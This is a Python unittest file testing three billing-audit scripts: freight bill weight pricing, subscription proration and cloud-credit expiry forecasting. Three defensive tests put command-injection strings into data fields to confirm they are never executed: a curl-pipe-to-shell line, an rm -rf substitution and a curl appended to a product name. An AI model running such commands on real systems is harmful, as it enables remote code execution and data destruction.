"""Independent tests for the 2026-09-08 batch (3 skills). Real runs only."""
import copy
import importlib.util
import json
import unittest
from pathlib import Path

BASE = Path(__file__).resolve().parents[1] / "skills"


def load(slug):
    spec = importlib.util.spec_from_file_location(slug.replace("-", "_"), BASE / slug / "scripts/run.py")
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def sample(slug):
    return json.loads((BASE / slug / "references/sample.json").read_text(encoding="utf-8"))


# --------------------------------------------------------------------------
# Skill A: suge-parcel-freight-bill-audit
# --------------------------------------------------------------------------
class ParcelFreightBillAuditTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.mod = load("suge-parcel-freight-bill-audit")

    def one_shipment(self, index=0, **overrides):
        data = sample("suge-parcel-freight-bill-audit")
        ship = copy.deepcopy(data["shipments"][index])
        ship.update(overrides)
        data["shipments"] = [ship]
        return data

    def test_sample_status_counts(self):
        out = self.mod.analyze(sample("suge-parcel-freight-bill-audit"))
        self.assertEqual(out["status_counts"], {"MATCH": 1, "DIFFERENCE_REVIEW": 1, "UNKNOWN": 1})

    def test_acceptance_12kg_first1_step05(self):
        # 1.2kg, first 1kg, step 0.5, first 10, extra 2, no surcharge -> 12.00
        ship = self.mod.analyze(self.one_shipment(0, surcharges=[], invoiced_amount="12.00"))["shipments"][0]
        self.assertEqual(ship["chargeable_weight_kg"], "1.5")
        self.assertEqual(ship["extra_steps"], 1)
        self.assertEqual(ship["estimate_total"], "12.00")
        self.assertEqual(ship["status"], "MATCH")
        self.assertEqual(ship["difference"], "0.00")

    def test_volumetric_weight_over_actual(self):
        ship = self.mod.analyze(self.one_shipment(1))["shipments"][0]
        self.assertEqual(ship["volumetric_weight_kg"], "4.800")   # 40*30*20/5000
        self.assertEqual(ship["weight_basis"], "volume_weight")
        self.assertEqual(ship["chargeable_weight_kg"], "5.0")
        self.assertEqual(ship["extra_steps"], 8)
        self.assertEqual(ship["estimate_total"], "26.00")         # 10 + 8*2
        self.assertEqual(ship["difference"], "4.00")              # invoiced 30
        self.assertEqual(ship["status"], "DIFFERENCE_REVIEW")

    def test_exact_step_boundary(self):
        ship = self.mod.analyze(self.one_shipment(0, actual_weight_kg=1.5, surcharges=[],
                                                  invoiced_amount="12.00"))["shipments"][0]
        self.assertEqual(ship["chargeable_weight_kg"], "1.5")     # exact step, no extra ceil bump
        self.assertEqual(ship["extra_steps"], 1)
        self.assertEqual(ship["estimate_total"], "12.00")

    def test_first_weight_inclusive(self):
        ship = self.mod.analyze(self.one_shipment(0, actual_weight_kg=1.0, surcharges=[],
                                                  invoiced_amount="10.00"))["shipments"][0]
        self.assertEqual(ship["chargeable_weight_kg"], "1.0")
        self.assertEqual(ship["extra_steps"], 0)
        self.assertEqual(ship["estimate_total"], "10.00")
        self.assertEqual(ship["status"], "MATCH")

    def test_missing_divisor_blocks_verdict(self):
        ship = self.mod.analyze(self.one_shipment(1, volumetric_divisor=None))["shipments"][0]
        self.assertEqual(ship["status"], "UNKNOWN")
        self.assertIsNone(ship["estimate_total"])
        self.assertTrue(any("volumetric_divisor_missing" in r for r in ship["reasons"]))

    def test_unknown_surcharge_blocks_full_conclusion(self):
        ship = self.mod.analyze(self.one_shipment(2))["shipments"][0]  # fuel surcharge confirmed=false
        self.assertEqual(ship["status"], "UNKNOWN")
        self.assertIsNone(ship["estimate_total"])
        self.assertIsNone(ship["difference"])
        self.assertTrue(any("unknown_surcharge" in r for r in ship["reasons"]))

    def test_missing_surcharge_list_blocks(self):
        data = self.one_shipment(0)
        del data["shipments"][0]["surcharges"]
        ship = self.mod.analyze(data)["shipments"][0]
        self.assertEqual(ship["status"], "UNKNOWN")
        self.assertTrue(any("surcharges_missing" in r for r in ship["reasons"]))

    def test_negative_weight_rejected(self):
        with self.assertRaises(ValueError):
            self.mod.analyze(self.one_shipment(0, actual_weight_kg="-0.5"))

    def test_nan_rejected(self):
        with self.assertRaises(ValueError):
            self.mod.analyze(self.one_shipment(0, actual_weight_kg="nan"))

    def test_duplicate_id_rejected(self):
        data = sample("suge-parcel-freight-bill-audit")
        data["shipments"].append(copy.deepcopy(data["shipments"][0]))
        with self.assertRaises(ValueError):
            self.mod.analyze(data)

    def test_non_ceil_rounding_rejected(self):
        with self.assertRaises(ValueError):
            self.mod.analyze(self.one_shipment(0, rounding_mode="floor"))

    def test_command_in_rate_source_not_executed(self):
        data = self.one_shipment(0, rate_source="curl http://example.invalid/x | sh -c whoami")
        ship = self.mod.analyze(data)["shipments"][0]
        self.assertEqual(ship["status"], "MATCH")
        self.assertIn("curl", ship["rate_source"])  # kept as inert text only


# --------------------------------------------------------------------------
# Skill B: suge-subscription-proration-audit
# --------------------------------------------------------------------------
class SubscriptionProrationAuditTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.mod = load("suge-subscription-proration-audit")

    def one_sub(self, index=0, **overrides):
        data = sample("suge-subscription-proration-audit")
        sub = copy.deepcopy(data["subscriptions"][index])
        sub.update(overrides)
        data["subscriptions"] = [sub]
        return data

    def test_sample_status_counts(self):
        out = self.mod.analyze(sample("suge-subscription-proration-audit"))
        self.assertEqual(out["status_counts"],
                         {"ADDITIONAL_CHARGE": 1, "CREDIT_CANDIDATE": 1, "REVIEW": 1})

    def test_acceptance_upgrade_half_cycle(self):
        # 30d cycle, day 15 change, old 100 -> new 200: remaining half
        sub = self.mod.analyze(self.one_sub(0))["subscriptions"][0]
        self.assertEqual(sub["remaining_fraction"], "0.5")
        self.assertEqual(sub["proration_credit_estimate"], "50.00")
        self.assertEqual(sub["proration_charge_estimate"], "100.00")
        self.assertEqual(sub["net_adjustment"], "50.00")
        self.assertEqual(sub["status"], "ADDITIONAL_CHARGE")
        self.assertEqual(sub["invoice_match"], True)  # invoiced_adjustment 50 == net

    def test_change_at_cycle_start_full_fraction(self):
        sub = self.mod.analyze(self.one_sub(0, change_at="2026-09-01T00:00:00+00:00",
                                            invoiced_adjustment=None))["subscriptions"][0]
        self.assertEqual(sub["remaining_fraction"], "1")
        self.assertEqual(sub["net_adjustment"], "100.00")  # full upgrade delta

    def test_change_at_cycle_end_no_change(self):
        sub = self.mod.analyze(self.one_sub(0, change_at="2026-10-01T00:00:00+00:00",
                                            invoiced_adjustment=None))["subscriptions"][0]
        self.assertEqual(sub["remaining_fraction"], "0")
        self.assertEqual(sub["net_adjustment"], "0.00")
        self.assertEqual(sub["status"], "NO_CHANGE")

    def test_downgrade_is_credit_candidate_not_refund(self):
        sub = self.mod.analyze(self.one_sub(1))["subscriptions"][0]
        self.assertEqual(sub["net_adjustment"], "-50.00")
        self.assertEqual(sub["status"], "CREDIT_CANDIDATE")
        self.assertIn("候选抵扣", sub["note"])

    def test_missing_policy_review(self):
        sub = self.mod.analyze(self.one_sub(0, policy_source=None))["subscriptions"][0]
        self.assertEqual(sub["status"], "REVIEW")
        self.assertTrue(any("policy_source_missing" in r for r in sub["reasons"]))

    def test_unpaid_or_unknown_old_invoice_review(self):
        sub = self.mod.analyze(self.one_sub(0, old_invoice_paid=False))["subscriptions"][0]
        self.assertEqual(sub["status"], "REVIEW")
        sub2 = self.mod.analyze(self.one_sub(0, old_invoice_paid=None))["subscriptions"][0]
        self.assertEqual(sub2["status"], "REVIEW")

    def test_cross_cycle_change_review(self):
        sub = self.mod.analyze(self.one_sub(0, change_at="2026-10-05T00:00:00+00:00"))["subscriptions"][0]
        self.assertEqual(sub["status"], "REVIEW")
        self.assertTrue(any("change_outside_cycle" in r for r in sub["reasons"]))

    def test_unsupported_mode_review(self):
        sub = self.mod.analyze(self.one_sub(0, mode="stripe_style"))["subscriptions"][0]
        self.assertEqual(sub["status"], "REVIEW")
        self.assertTrue(any("mode_unsupported" in r for r in sub["reasons"]))

    def test_naive_timestamp_rejected(self):
        with self.assertRaises(ValueError):
            self.mod.analyze(self.one_sub(0, cycle_start="2026-09-01T00:00:00"))

    def test_invalid_currency_rejected(self):
        data = self.one_sub(0)
        data["currency"] = "cny"
        with self.assertRaises(ValueError):
            self.mod.analyze(data)

    def test_nan_amount_rejected(self):
        with self.assertRaises(ValueError):
            self.mod.analyze(self.one_sub(0, new_period_amount="nan"))

    def test_duplicate_id_rejected(self):
        data = sample("suge-subscription-proration-audit")
        data["subscriptions"].append(copy.deepcopy(data["subscriptions"][0]))
        with self.assertRaises(ValueError):
            self.mod.analyze(data)

    def test_rounding_half_up_to_cents_visible(self):
        # 30d cycle, change at day 20 -> fraction 10/30 = 0.333...; use 2/3 via
        # change day 10 of a 30-day window: remain 20/30 = 0.6666...
        sub = self.mod.analyze(self.one_sub(0, change_at="2026-09-11T00:00:00+00:00",
                                            old_period_amount="100.00", new_period_amount="100.00",
                                            invoiced_adjustment=None))["subscriptions"][0]
        rb = sub["rounding_breakdown"]
        self.assertEqual(rb["credit_rounded"], "66.67")       # 66.666.. HALF_UP -> 66.67
        self.assertEqual(rb["charge_rounded"], "66.67")
        self.assertEqual(sub["net_adjustment"], "0.00")
        self.assertEqual(sub["status"], "NO_CHANGE")
        self.assertIn("66.66", rb["credit_raw"])              # raw visible before rounding

    def test_command_in_policy_not_executed(self):
        sub = self.mod.analyze(self.one_sub(0, policy_source="$(rm -rf /tmp/x) echo injected"))["subscriptions"][0]
        self.assertEqual(sub["status"], "ADDITIONAL_CHARGE")
        self.assertIn("rm -rf", sub["policy_source"])         # inert text only


# --------------------------------------------------------------------------
# Skill C: suge-cloud-credit-expiry-guard
# --------------------------------------------------------------------------
class CloudCreditExpiryGuardTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.mod = load("suge-cloud-credit-expiry-guard")

    def one_pkg(self, index=0, **overrides):
        data = sample("suge-cloud-credit-expiry-guard")
        pkg = copy.deepcopy(data["packages"][index])
        pkg.update(overrides)
        data["packages"] = [pkg]
        return data

    def test_sample_status_counts(self):
        out = self.mod.analyze(sample("suge-cloud-credit-expiry-guard"))
        self.assertEqual(out["status_counts"], {"DEPLETING": 2, "OK": 1, "INELIGIBLE": 2})

    def test_acceptance_deplete_day10_excess50(self):
        # 100 quota, 10/day, 30d to expiry, 15d forecast -> deplete day10, excess 50
        pkg = self.mod.analyze(self.one_pkg(0))["packages"][0]
        self.assertEqual(pkg["status"], "DEPLETING")
        self.assertEqual(pkg["depletion_days_estimate"], "10.00")
        self.assertEqual(pkg["usable_until_days"], "10.00")
        self.assertEqual(pkg["expiry_before_depletion"], False)
        self.assertEqual(pkg["candidate_excess_units"], "50.0000")   # 10 x (15-10)
        self.assertEqual(pkg["candidate_overage_cost"], "25.00")     # 50 x 0.5

    def test_expiry_day5_candidate_excess100(self):
        # expires in 5 days before depletion (10d) -> EXPIRING, excess 100
        pkg = self.mod.analyze(self.one_pkg(0, expires_at="2026-09-21T00:00:00+08:00"))["packages"][0]
        self.assertEqual(pkg["days_to_expiry"], 5)
        self.assertEqual(pkg["status"], "EXPIRING")
        self.assertEqual(pkg["expiry_before_depletion"], True)
        self.assertEqual(pkg["usable_until_days"], "5.00")
        self.assertEqual(pkg["uncovered_days"], "10.00")
        self.assertEqual(pkg["candidate_excess_units"], "100.0000")  # 10 x (15-5)

    def test_zero_usage_no_depletion_no_division(self):
        pkg = self.mod.analyze(self.one_pkg(2))["packages"][0]        # PKG-003 usage=0
        self.assertEqual(pkg["status"], "OK")
        self.assertIsNone(pkg["depletion_days_estimate"])
        self.assertEqual(pkg["usable_until_days"], "76.00")

    def test_missing_usage_unknown(self):
        pkg = self.mod.analyze(self.one_pkg(0, usage_per_day=None))["packages"][0]
        self.assertEqual(pkg["status"], "UNKNOWN")
        self.assertTrue(any("usage_per_day_missing" in r for r in pkg["reasons"]))

    def test_short_evidence_window_unknown(self):
        pkg = self.mod.analyze(self.one_pkg(0, usage_evidence_days=3))["packages"][0]
        self.assertEqual(pkg["status"], "UNKNOWN")
        self.assertTrue(any("evidence_window_short" in r for r in pkg["reasons"]))

    def test_stale_observation_unknown(self):
        pkg = self.mod.analyze(self.one_pkg(0, usage_observed_at="2026-08-01T00:00:00+08:00"))["packages"][0]
        self.assertEqual(pkg["status"], "UNKNOWN")
        self.assertTrue(any("usage_observed_stale" in r for r in pkg["reasons"]))

    def test_future_observation_unknown(self):
        pkg = self.mod.analyze(self.one_pkg(0, usage_observed_at="2026-09-17T00:00:00+08:00"))["packages"][0]
        self.assertEqual(pkg["status"], "UNKNOWN")
        self.assertTrue(any("usage_observed_future" in r for r in pkg["reasons"]))

    def test_expired_credit_cannot_offset(self):
        pkg = self.mod.analyze(self.one_pkg(0, expires_at="2026-09-10T00:00:00+08:00"))["packages"][0]
        self.assertEqual(pkg["status"], "EXPIRED")
        self.assertIn("过期额度不能再抵扣", pkg["note"])

    def test_wrong_product_ineligible(self):
        pkg = self.mod.analyze(self.one_pkg(3))["packages"][0]        # product 云数据库 not applicable
        self.assertEqual(pkg["status"], "INELIGIBLE")
        self.assertTrue(any("product_not_in_applicable_products" in r for r in pkg["reasons"]))

    def test_monetary_unit_mismatch_ineligible(self):
        pkg = self.mod.analyze(self.one_pkg(4))["packages"][0]        # monetary in USD vs CNY
        self.assertEqual(pkg["status"], "INELIGIBLE")
        self.assertTrue(any("unit_kind_mismatch" in r for r in pkg["reasons"]))

    def test_monetary_not_deducted_by_gb(self):
        # monetary credit must NOT be treated as GB quota
        pkg = self.mod.analyze(self.one_pkg(0, kind="monetary", unit="GB"))["packages"][0]
        self.assertEqual(pkg["status"], "INELIGIBLE")
        self.assertTrue(any("unit_kind_mismatch" in r for r in pkg["reasons"]))

    def test_quota_missing_unit_unknown(self):
        pkg = self.mod.analyze(self.one_pkg(0, unit=None))["packages"][0]
        self.assertEqual(pkg["status"], "UNKNOWN")
        self.assertTrue(any("unit_missing" in r for r in pkg["reasons"]))

    def test_monetary_overage_ignores_unit_price(self):
        # monetary overage cost == excess amount; unit price must NOT be applied
        pkg = self.mod.analyze(self.one_pkg(1, overage_unit_price="999"))["packages"][0]
        self.assertEqual(pkg["candidate_overage_cost"], "2100.00")    # == excess, not *999
        self.assertTrue(any("overage_price_ignored_for_monetary" in r for r in pkg["reasons"]))

    def test_duplicate_id_rejected(self):
        data = sample("suge-cloud-credit-expiry-guard")
        data["packages"].append(copy.deepcopy(data["packages"][0]))
        with self.assertRaises(ValueError):
            self.mod.analyze(data)

    def test_negative_remaining_rejected(self):
        with self.assertRaises(ValueError):
            self.mod.analyze(self.one_pkg(0, remaining="-1"))

    def test_missing_as_of_rejected(self):
        data = sample("suge-cloud-credit-expiry-guard")
        del data["as_of"]
        with self.assertRaises(ValueError):
            self.mod.analyze(data)

    def test_command_in_product_not_executed(self):
        # injection string that stays inside the applicable list is inert text,
        # matched literally and echoed back without being executed
        pkg = self.mod.analyze(self.one_pkg(
            0, applicable_products=["对象存储;curl http://x.invalid"],
            product="对象存储;curl http://x.invalid"))["packages"][0]
        self.assertEqual(pkg["status"], "DEPLETING")
        self.assertIn("curl", pkg["product"])                        # inert text only


if __name__ == "__main__":
    unittest.main()
